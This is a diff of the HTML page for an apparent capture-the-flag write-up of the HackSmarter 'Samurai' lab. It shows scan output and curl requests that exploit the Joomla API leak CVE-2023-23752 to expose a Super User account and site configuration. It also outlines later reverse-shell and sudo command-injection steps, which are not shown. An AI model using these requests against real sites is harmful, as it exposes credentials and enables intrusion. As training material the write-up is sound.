@@ -182,6 +182,16 @@
   
   
 
+  
+  
+  
+  
+  <script
+    defer
+    type="text/javascript"
+    src="/js/mermaid.bundle.ceb61d1b03724873f4afba209d5f9a6d9db9f2aa8bea1de39196f6ebe8b4f076c85e46f12ab9ec8bfc33bb7c2b063894c8f91e6199f07a1cac975892cd77823b.js"
+    integrity="sha512-zrYdGwNySHP0r7ognV&#43;abZ258qqL6h3jkZb26&#43;i08HbIXkbxKrnsi/wzu3wrBjiUyPkeYZnwehysl1iSzXeCOw=="></script>
+
 
 
 
@@ -261,7 +271,7 @@
     
     
     "mainEntityOfPage": "http://localhost:1313/posts/samurai/",
-    "wordCount":  1838 
+    "wordCount":  2000 
   },
   {
     "@context": "https://schema.org",
@@ -735,7 +745,7 @@
   <div class="flex flex-row flex-wrap items-center">
     
     
-      <time datetime="0001-01-01T00:00:00&#43;00:00">1 January 0001</time><span class="px-2 text-primary-500">&middot;</span><span>1838 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">9 mins</span><span class="px-2 text-primary-500">&middot;</span><span class="mb-[2px]">
+      <time datetime="0001-01-01T00:00:00&#43;00:00">1 January 0001</time><span class="px-2 text-primary-500">&middot;</span><span>2000 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">10 mins</span><span class="px-2 text-primary-500">&middot;</span><span class="mb-[2px]">
   <span
     id="zen-mode-button"
     class="text-lg hover:text-primary-500"
@@ -921,16 +931,16 @@
         <li><a href="#initial-access">Initial Access</a></li>
       </ul>
     </li>
-  </ul>
-
-  <ul>
-    <li><a href="#nmap">Nmap</a></li>
-    <li><a href="#found-joomla-login-page-at-httpsamuraihsmadministrator">Found Joomla login page at <code>http://samurai.hsm/administrator/</code></a></li>
+    <li><a href="#attack-path">Attack Path</a></li>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#nmap">Nmap</a></li>
+      </ul>
+    </li>
+    <li><a href="#found-joomla-login-page">Found Joomla login page</a></li>
     <li><a href="#nikto-scan">Nikto Scan</a></li>
-  </ul>
-
-  <ul>
-    <li>
+    <li><a href="#version-enumeration-with-joomscan">Version Enumeration with Joomscan</a></li>
+    <li><a href="#user-enumeration-via-cve-2023-23752">User Enumeration via CVE-2023-23752</a>
       <ul>
         <li><a href="#user-enumeration">User Enumeration</a></li>
         <li><a href="#password-dump">Password Dump</a></li>
@@ -941,6 +951,7 @@
         <li><a href="#credentials-found-via-curl">Credentials found via curl</a></li>
       </ul>
     </li>
+    <li><a href="#shell-as-root-user">Shell as root user</a></li>
   </ul>
 </nav>
   </div>
@@ -959,16 +970,16 @@
         <li><a href="#initial-access">Initial Access</a></li>
       </ul>
     </li>
-  </ul>
-
-  <ul>
-    <li><a href="#nmap">Nmap</a></li>
-    <li><a href="#found-joomla-login-page-at-httpsamuraihsmadministrator">Found Joomla login page at <code>http://samurai.hsm/administrator/</code></a></li>
+    <li><a href="#attack-path">Attack Path</a></li>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#nmap">Nmap</a></li>
+      </ul>
+    </li>
+    <li><a href="#found-joomla-login-page">Found Joomla login page</a></li>
     <li><a href="#nikto-scan">Nikto Scan</a></li>
-  </ul>
-
-  <ul>
-    <li>
+    <li><a href="#version-enumeration-with-joomscan">Version Enumeration with Joomscan</a></li>
+    <li><a href="#user-enumeration-via-cve-2023-23752">User Enumeration via CVE-2023-23752</a>
       <ul>
         <li><a href="#user-enumeration">User Enumeration</a></li>
         <li><a href="#password-dump">Password Dump</a></li>
@@ -979,6 +990,7 @@
         <li><a href="#credentials-found-via-curl">Credentials found via curl</a></li>
       </ul>
     </li>
+    <li><a href="#shell-as-root-user">Shell as root user</a></li>
   </ul>
 </nav>
   </div>
@@ -1110,7 +1122,48 @@
         
 
         <div class="article-content max-w-prose mb-20">
-          
+          <div class="lead text-neutral-500 dark:text-neutral-400 !mb-9 text-xl">
+  HackSmarter&rsquo;s Samurai chains an unauthenticated Joomla API leak (CVE-2023-23752) into admin access, a PHP shell, and root through a command-injection flaw in a sudo-allowed binary.
+</div>
+
+<p><span class="flex cursor-pointer">
+  
+  
+  
+  
+    <span
+      class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+  
+    HackSmarter
+  </span>
+</span>
+
+ <span class="flex cursor-pointer">
+  
+  
+  
+  
+    <span
+      class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+  
+    Joomla 4.2.5
+  </span>
+</span>
+
+ <span class="flex cursor-pointer">
+  
+  
+  
+  
+    <span
+      class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+  
+    Linux
+  </span>
+</span>
+
+</p>
+
 <h2 class="relative group">Objective
     <div id="objective" class="anchor"></div>
     
@@ -1134,9 +1187,139 @@ foothold, and escalate privileges to root.</p>
     
 </h3>
 <p>You have been provisioned VPN access to the client environment. No initial credentials are provided.</p>
+
+<h2 class="relative group">Attack Path
+    <div id="attack-path" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#attack-path" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+
+
+
+
+
+<div
+  id="accordion-428ffaaaaf24fc27c153e96ad1b30535"
+  class="space-y-2"
+  data-accordion="collapse"
+  data-accordion-separated="true"
+>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+<details
+  class="group rounded-lg border border-neutral-200 dark:border-neutral-700 overflow-hidden"
+  data-accordion-item
+  
+>
+  <summary class="flex w-full cursor-pointer items-center justify-between gap-4 px-4 py-3 text-left text-lg font-semibold text-neutral-900 dark:text-neutral-100">
+    <span class="flex items-center gap-2">
+      
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
+<path fill="currentColor"  d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6zm80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3L562.7 256l-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3z"/></svg></span>
+      
+      <span>Attack Path</span>
+    </span>
+    <span class="accordion-chevron ms-auto flex h-5 w-5 items-center justify-center print:hidden">
+      <span class="relative block icon"><svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+</span>
+    </span>
+  </summary>
+<div class="px-4 pb-4 text-neutral-700 dark:text-neutral-300">
+    <pre class="not-prose mermaid">
+
+---
+config:
+
+    treeView:
+    showIcons: true
+---
+treeView-beta
+    recon/
+        nmap ## SSH 22 and Apache 2.4.52 on port 80
+        nikto ## Admin page and exposed shell history files
+        joomscan ## Joomla 4.2.5 identified
+    initial-access/
+        CVE-2023-23752 :::highlight ## Unauthenticated Joomla API leak
+        users.json ## Username: miyamoto
+        config.json ## Database password exposed
+        admin-login ## Same password reused for the admin panel
+    foothold/
+        index.php :::highlight ## Admin template edited to inject a PHP reverse shell
+        www-data ## Shell received on the listener
+    privilege-escalation/
+        sudo-l ## DbMaria allowed as root without a password
+        DbMaria :::highlight ## Command injection in its argument
+        root.txt ## Root shell obtained
+</pre>
+
+  </div>
+</details>
+
+</div>
+
+<style>
+  #accordion-428ffaaaaf24fc27c153e96ad1b30535 > details + details {
+    margin-top: 0.5rem;
+  }
+</style>
+
+<style>
+  #accordion-428ffaaaaf24fc27c153e96ad1b30535 details[data-accordion-item] > summary .accordion-chevron {
+    transform: rotate(-90deg);
+    transition: transform 200ms ease-in-out;
+  }
+  #accordion-428ffaaaaf24fc27c153e96ad1b30535 details[data-accordion-item][open] > summary .accordion-chevron {
+    transform: rotate(0deg);
+  }
+</style>
+
+<script>
+  (() => {
+    const root = document.getElementById("accordion-428ffaaaaf24fc27c153e96ad1b30535");
+    if (!root) return;
+    const items = root.querySelectorAll("details[data-accordion-item]");
+    items.forEach((item) => {
+      item.addEventListener("toggle", () => {
+        if (!item.open) return;
+        items.forEach((other) => {
+          if (other !== item) other.removeAttribute("open");
+        });
+      });
+    });
+  })();
+</script>
+
+
 <hr>
 
-<h1 class="relative group">Enumeration
+<h2 class="relative group">Enumeration
     <div id="enumeration" class="anchor"></div>
     
     <span
@@ -1144,9 +1327,9 @@ foothold, and escalate privileges to root.</p>
         <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#enumeration" aria-label="Anchor">#</a>
     </span>
     
-</h1>
+</h2>
 
-<h2 class="relative group">Nmap
+<h3 class="relative group">Nmap
     <div id="nmap" class="anchor"></div>
     
     <span
@@ -1154,8 +1337,66 @@ foothold, and escalate privileges to root.</p>
         <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#nmap" aria-label="Anchor">#</a>
     </span>
     
-</h2>
+</h3>
 <div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    22/tcp open  ssh     syn-ack ttl <span class="m">62</span> OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line hl"><span class="cl">    80/tcp open  http    syn-ack ttl <span class="m">62</span> Apache httpd 2.4.52 <span class="o">((</span>Ubuntu<span class="o">))</span></span></span></code></pre></div></div>
+
+
+
+
+
+<div
+  id="accordion-482387f88d10ec15b02c877612a3772b"
+  class="space-y-2"
+  data-accordion="collapse"
+  data-accordion-separated="true"
+>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+<details
+  class="group rounded-lg border border-neutral-200 dark:border-neutral-700 overflow-hidden"
+  data-accordion-item
+  
+>
+  <summary class="flex w-full cursor-pointer items-center justify-between gap-4 px-4 py-3 text-left text-lg font-semibold text-neutral-900 dark:text-neutral-100">
+    <span class="flex items-center gap-2">
+      
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
+<path fill="currentColor"  d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6zm80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3L562.7 256l-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3z"/></svg></span>
+      
+      <span>Full Nmap output</span>
+    </span>
+    <span class="accordion-chevron ms-auto flex h-5 w-5 items-center justify-center print:hidden">
+      <span class="relative block icon"><svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+</span>
+    </span>
+  </summary>
+<div class="px-4 pb-4 text-neutral-700 dark:text-neutral-300">
+    <div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">PORT   STATE SERVICE REASON         VERSION
 </span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack ttl <span class="m">62</span> OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
 </span></span><span class="line"><span class="cl">
@@ -1408,16 +1649,67 @@ foothold, and escalate privileges to root.</p>
 </span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 17.61 seconds
 </span></span><span class="line"><span class="cl">           Raw packets sent: <span class="m">68</span> <span class="o">(</span>4.684KB<span class="o">)</span> <span class="p">|</span> Rcvd: <span class="m">40</span> <span class="o">(</span>3.056KB<span class="o">)</span></span></span></code></pre></div></div>
 
-<h2 class="relative group">Found Joomla login page at <code>http://samurai.hsm/administrator/</code>
-    <div id="found-joomla-login-page-at-httpsamuraihsmadministrator" class="anchor"></div>
+  </div>
+</details>
+
+</div>
+
+<style>
+  #accordion-482387f88d10ec15b02c877612a3772b > details + details {
+    margin-top: 0.5rem;
+  }
+</style>
+
+<style>
+  #accordion-482387f88d10ec15b02c877612a3772b details[data-accordion-item] > summary .accordion-chevron {
+    transform: rotate(-90deg);
+    transition: transform 200ms ease-in-out;
+  }
+  #accordion-482387f88d10ec15b02c877612a3772b details[data-accordion-item][open] > summary .accordion-chevron {
+    transform: rotate(0deg);
+  }
+</style>
+
+<script>
+  (() => {
+    const root = document.getElementById("accordion-482387f88d10ec15b02c877612a3772b");
+    if (!root) return;
+    const items = root.querySelectorAll("details[data-accordion-item]");
+    items.forEach((item) => {
+      item.addEventListener("toggle", () => {
+        if (!item.open) return;
+        items.forEach((other) => {
+          if (other !== item) other.removeAttribute("open");
+        });
+      });
+    });
+  })();
+</script>
+
+
+
+<h2 class="relative group">Found Joomla login page
+    <div id="found-joomla-login-page" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
-        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#found-joomla-login-page-at-httpsamuraihsmadministrator" aria-label="Anchor">#</a>
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#found-joomla-login-page" aria-label="Anchor">#</a>
     </span>
     
 </h2>
-<p>!image.png</p>
+<p><code>http://samurai.hsm/administrator/</code></p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="Joomla login page"
+    width="1918"
+    height="865"
+    src="/posts/samurai/joomla-login_hu_1af30d2096eb3655.png"
+    srcset="/posts/samurai/joomla-login_hu_1af30d2096eb3655.png 800w, /posts/samurai/joomla-login_hu_a3b2db8d0529c0fb.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/posts/samurai/joomla-login.png"></figure>
 
 <h2 class="relative group">Nikto Scan
     <div id="nikto-scan" class="anchor"></div>
@@ -1428,7 +1720,62 @@ foothold, and escalate privileges to root.</p>
     </span>
     
 </h2>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>dfaults㉿kali<span class="o">)</span>-<span class="o">[</span>~/ctf/hacksmarter/samurai<span class="o">]</span>
+
+
+
+
+
+<div
+  id="accordion-30b8a82728c2246bd1fdc46eb21a8db7"
+  class="space-y-2"
+  data-accordion="collapse"
+  data-accordion-separated="true"
+>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+<details
+  class="group rounded-lg border border-neutral-200 dark:border-neutral-700 overflow-hidden"
+  data-accordion-item
+  
+>
+  <summary class="flex w-full cursor-pointer items-center justify-between gap-4 px-4 py-3 text-left text-lg font-semibold text-neutral-900 dark:text-neutral-100">
+    <span class="flex items-center gap-2">
+      
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
+<path fill="currentColor"  d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6zm80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3L562.7 256l-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3z"/></svg></span>
+      
+      <span>Nikto Scan</span>
+    </span>
+    <span class="accordion-chevron ms-auto flex h-5 w-5 items-center justify-center print:hidden">
+      <span class="relative block icon"><svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+</span>
+    </span>
+  </summary>
+<div class="px-4 pb-4 text-neutral-700 dark:text-neutral-300">
+    <div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>dfaults㉿kali<span class="o">)</span>-<span class="o">[</span>~/ctf/hacksmarter/samurai<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ nikto -url http://samurai.hsm/                  
 </span></span><span class="line"><span class="cl">- Nikto v2.6.0
 </span></span><span class="line"><span class="cl">---------------------------------------------------------------------------
@@ -1477,7 +1824,46 @@ foothold, and escalate privileges to root.</p>
 </span></span><span class="line"><span class="cl">---------------------------------------------------------------------------
 </span></span><span class="line"><span class="cl">+ <span class="m">1</span> host<span class="o">(</span>s<span class="o">)</span> tested</span></span></code></pre></div></div>
 
-<h1 class="relative group">Version Enumeration with Joomscan
+  </div>
+</details>
+
+</div>
+
+<style>
+  #accordion-30b8a82728c2246bd1fdc46eb21a8db7 > details + details {
+    margin-top: 0.5rem;
+  }
+</style>
+
+<style>
+  #accordion-30b8a82728c2246bd1fdc46eb21a8db7 details[data-accordion-item] > summary .accordion-chevron {
+    transform: rotate(-90deg);
+    transition: transform 200ms ease-in-out;
+  }
+  #accordion-30b8a82728c2246bd1fdc46eb21a8db7 details[data-accordion-item][open] > summary .accordion-chevron {
+    transform: rotate(0deg);
+  }
+</style>
+
+<script>
+  (() => {
+    const root = document.getElementById("accordion-30b8a82728c2246bd1fdc46eb21a8db7");
+    if (!root) return;
+    const items = root.querySelectorAll("details[data-accordion-item]");
+    items.forEach((item) => {
+      item.addEventListener("toggle", () => {
+        if (!item.open) return;
+        items.forEach((other) => {
+          if (other !== item) other.removeAttribute("open");
+        });
+      });
+    });
+  })();
+</script>
+
+
+
+<h2 class="relative group">Version Enumeration with Joomscan
     <div id="version-enumeration-with-joomscan" class="anchor"></div>
     
     <span
@@ -1485,7 +1871,7 @@ foothold, and escalate privileges to root.</p>
         <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#version-enumeration-with-joomscan" aria-label="Anchor">#</a>
     </span>
     
-</h1>
+</h2>
 <p>Joomscan is a tool for identifying the Joomla version installed on a web server. To use it it’s as simple as <code>joomscan -u example.site</code> and watch it give back the version.</p>
 <div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    ____  _____  _____  __  __  ___   ___    __    _  _ 
@@ -1507,9 +1893,9 @@ foothold, and escalate privileges to root.</p>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>++<span class="o">]</span> Firewall not detected
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Detecting Joomla Version
-</span></span><span class="line"><span class="cl"><span class="o">[</span>++<span class="o">]</span> Joomla 4.2.5</span></span></code></pre></div></div>
+</span></span><span class="line hl"><span class="cl"><span class="o">[</span>++<span class="o">]</span> Joomla 4.2.5</span></span></code></pre></div></div>
 
-<h1 class="relative group">User Enumeration via <code>CVE-**2023-23752**</code>
+<h2 class="relative group">User Enumeration via CVE-2023-23752
     <div id="user-enumeration-via-cve-2023-23752" class="anchor"></div>
     
     <span
@@ -1517,7 +1903,7 @@ foothold, and escalate privileges to root.</p>
         <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#user-enumeration-via-cve-2023-23752" aria-label="Anchor">#</a>
     </span>
     
-</h1>
+</h2>
 <p><a href="https://www.exploit-db.com/exploits/51334"  target="_blank" rel="noreferrer">https://www.exploit-db.com/exploits/51334</a></p>
 <p>Manually checking, we can curl the endpoint the script is using to get the information we need</p>
 
@@ -1530,7 +1916,8 @@ foothold, and escalate privileges to root.</p>
     </span>
     
 </h3>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>dfaults㉿kali<span class="o">)</span>-<span class="o">[</span>~/ctf/hacksmarter/samurai<span class="o">]</span>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>dfaults㉿kali<span class="o">)</span>-<span class="o">[</span>~/ctf/hacksmarter/samurai<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ curl -i http://samurai.hsm/api/index.php/v1/users?public<span class="o">=</span><span class="nb">true</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
@@ -1547,7 +1934,7 @@ foothold, and escalate privileges to root.</p>
 </span></span><span class="line"><span class="cl">Content-Length: <span class="m">389</span>
 </span></span><span class="line"><span class="cl">Content-Type: application/vnd.api+json<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;links&#34;</span>:<span class="o">{</span><span class="s2">&#34;self&#34;</span>:<span class="s2">&#34;http:\/\/samurai.hsm\/api\/index.php\/v1\/users?public=true&#34;</span><span class="o">}</span>,<span class="s2">&#34;data&#34;</span>:<span class="o">[{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;users&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;769&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;id&#34;</span>:769,<span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;Oda&#34;</span>,<span class="s2">&#34;username&#34;</span>:<span class="s2">&#34;Miyamoto&#34;</span>,<span class="s2">&#34;email&#34;</span>:<span class="s2">&#34;oda@local.local&#34;</span>,<span class="s2">&#34;block&#34;</span>:0,<span class="s2">&#34;sendEmail&#34;</span>:1,<span class="s2">&#34;registerDate&#34;</span>:<span class="s2">&#34;2026-03-06 09:02:33&#34;</span>,<span class="s2">&#34;lastvisitDate&#34;</span>:null,<span class="s2">&#34;lastResetTime&#34;</span>:null,<span class="s2">&#34;resetCount&#34;</span>:0,<span class="s2">&#34;group_count&#34;</span>:1,<span class="s2">&#34;group_names&#34;</span>:<span class="s2">&#34;Super Users&#34;</span><span class="o">}}]</span>,<span class="s2">&#34;meta&#34;</span>:<span class="o">{</span><span class="s2">&#34;total-pages&#34;</span>:1<span class="o">}}</span></span></span></code></pre></div></div>
+</span></span><span class="line hl"><span class="cl"><span class="o">{</span><span class="s2">&#34;links&#34;</span>:<span class="o">{</span><span class="s2">&#34;self&#34;</span>:<span class="s2">&#34;http:\/\/samurai.hsm\/api\/index.php\/v1\/users?public=true&#34;</span><span class="o">}</span>,<span class="s2">&#34;data&#34;</span>:<span class="o">[{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;users&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;769&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;id&#34;</span>:769,<span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;Oda&#34;</span>,<span class="s2">&#34;username&#34;</span>:<span class="s2">&#34;Miyamoto&#34;</span>,<span class="s2">&#34;email&#34;</span>:<span class="s2">&#34;oda@local.local&#34;</span>,<span class="s2">&#34;block&#34;</span>:0,<span class="s2">&#34;sendEmail&#34;</span>:1,<span class="s2">&#34;registerDate&#34;</span>:<span class="s2">&#34;2026-03-06 09:02:33&#34;</span>,<span class="s2">&#34;lastvisitDate&#34;</span>:null,<span class="s2">&#34;lastResetTime&#34;</span>:null,<span class="s2">&#34;resetCount&#34;</span>:0,<span class="s2">&#34;group_count&#34;</span>:1,<span class="s2">&#34;group_names&#34;</span>:<span class="s2">&#34;Super Users&#34;</span><span class="o">}}]</span>,<span class="s2">&#34;meta&#34;</span>:<span class="o">{</span><span class="s2">&#34;total-pages&#34;</span>:1<span class="o">}}</span></span></span></code></pre></div></div>
 
 <h3 class="relative group">Password Dump
     <div id="password-dump" class="anchor"></div>
@@ -1575,7 +1962,7 @@ foothold, and escalate privileges to root.</p>
 </span></span><span class="line"><span class="cl">Content-Length: <span class="m">1996</span>
 </span></span><span class="line"><span class="cl">Content-Type: application/vnd.api+json<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;links&#34;</span>:<span class="o">{</span><span class="s2">&#34;self&#34;</span>:<span class="s2">&#34;http:\/\/samurai.hsm\/api\/index.php\/v1\/config\/application?public=true&#34;</span>,<span class="s2">&#34;next&#34;</span>:<span class="s2">&#34;http:\/\/samurai.hsm\/api\/index.php\/v1\/config\/application?public=true&amp;page%5Boffset%5D=20&amp;page%5Blimit%5D=20&#34;</span>,<span class="s2">&#34;last&#34;</span>:<span class="s2">&#34;http:\/\/samurai.hsm\/api\/index.php\/v1\/config\/application?public=true&amp;page%5Boffset%5D=60&amp;page%5Blimit%5D=20&#34;</span><span class="o">}</span>,<span class="s2">&#34;data&#34;</span>:<span class="o">[{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;offline&#34;</span>:false,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;offline_message&#34;</span>:<span class="s2">&#34;This site is down for maintenance.&lt;br&gt;Please check back again soon.&#34;</span>,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;display_offline_message&#34;</span>:1,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;offline_image&#34;</span>:<span class="s2">&#34;&#34;</span>,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;sitename&#34;</span>:<span class="s2">&#34;Samurai&#34;</span>,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;editor&#34;</span>:<span class="s2">&#34;tinymce&#34;</span>,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;captcha&#34;</span>:<span 